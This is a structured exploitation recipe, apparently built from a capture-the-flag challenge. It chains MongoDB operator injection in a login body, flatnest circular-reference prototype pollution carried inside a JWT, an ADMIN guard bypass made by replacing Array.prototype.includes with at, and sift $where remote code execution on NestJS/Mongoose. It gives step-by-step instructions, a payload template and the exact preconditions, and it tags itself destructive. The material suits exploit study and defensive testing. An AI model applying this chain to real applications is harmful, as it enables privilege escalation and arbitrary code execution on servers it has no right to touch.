---
name: nosqli_jwt_flatnest_circular_prototype_pollution_rce
vuln_type: nosqli
sub_technique: operator_injection_flatnest_circular_pp_rce
category: exploitation
safety_level: destructive
tags:
- nosqli
- operator-injection
- jwt
- flatnest
- circular-reference
- prototype-pollution
- mongoose
- sift
- rce
---

# Mongodb Operator Injection + Jwt Flatnest Circular Ref → Prototype Pollution → Mongoose Sift $Where Rce

## When to Apply

Login uses `username.length` for validation (bypassed with object input) and `distinct('password', {username})` for DB query (accepts operator objects). JWT payload is built via `flatten(username_obj)` and restored with `nest(payload)`. flatnest restores `[Circular (...)]` strings as actual references, enabling prototype pollution via the JWT token itself. Guards use `roles.includes()` which breaks when Array.prototype.includes is overwritten with Array.prototype.at.

## Prerequisites

- NestJS with Mongoose + sift 17.1.3
- flatnest flatten()/nest() used in JWT creation/verification
- Login accepts non-string username (no type check before .length)
- Scene model with frames: string[] matching user usernames
- trim: true on username schema (allows trailing space registration trick)

## Steps

1. Register `scene-1 ` (trailing space) → stored as `scene-1` (trim).
2. Second login with object username:
   `{$eq:'scene-1', $not:{$geoIntersects:{$geometry:{...pollution keys...}}}}`
3. Pollution keys in $geometry via flatnest Circular references:
   - `a` → Array.prototype, `a.includes` → Array.prototype.at (ADMIN bypass)
   - `b` → Object.prototype, `b.populate[0]` → {path:'frames', model:'User', ...}
   - `b.$where` → RCE payload string
4. JWT token carries all pollution. On any authenticated request, nest() restores circular refs → pollution applied.
5. GET /api/scene (ADMIN-only): guard passes because includes=at returns truthy.
6. sceneModel.find() inherits polluted populate → frames joined to User model.
7. match[1] has no own $where (bypasses throwOn$where), but inherits it from prototype.
8. sift executes `new Function('obj', 'return '+payload)` → reads /flag, writes to User.password.
9. Response contains populated User with flag in password field.

## Code Template

```
geometry = {
    'type': 'Point', 'coordinates': [0,0], 'x': [1],
    'a': '[Circular (...x.constructor.prototype)]',
    'a.includes': '[Circular (...x.constructor.prototype.at)]',
    'b': '[Circular (...x.constructor.prototype.__proto__)]',
    'b.populate[0].path': 'frames', 'b.populate[0].model': 'User',
    'b.$where': '((()=>{...read /flag...this.password=flag;return true})())',
}
login_body = {'username': {'$eq': scene_name, '$not': {'$geoIntersects': {'$geometry': geometry}}}, 'password': pw}
```

## Examples

### Example 1

- **admin_bypass**: Array.prototype.includes = Array.prototype.at → ['ADMIN'].at('USER') returns 'ADMIN' (truthy)
- **throwon_where_bypass**: Object.keys(match[1]) has no $where → only inherited from prototype
- **cleanup**: RCE payload restores Array.prototype.includes and deletes polluted properties

Single login request achieves both privilege escalation and RCE setup. The flatnest circular reference feature is the critical enabler — it converts string markers in JWT into actual JavaScript object references at nest() time.
